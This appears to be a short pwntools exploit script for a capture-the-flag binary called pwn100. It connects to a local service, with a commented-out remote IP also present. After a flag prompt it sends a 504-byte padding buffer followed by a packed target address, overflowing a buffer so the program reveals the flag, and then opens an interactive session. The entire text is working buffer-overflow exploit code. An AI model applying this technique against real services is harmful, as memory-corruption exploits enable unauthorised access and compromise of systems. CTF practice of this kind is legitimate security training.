from pwn import *

context(log_level="debug")
flag_addr = 0x600DC0

# p  = process('./pwn100')

#gdb.attach(pidof(p)[0])

# p=remote('58.213.63.30',60001)
p = remote("127.0.0.1",10004)
p.recvuntil('he flag?\n')
p.sendline('a'*504+p64(flag_addr))
p.interactive()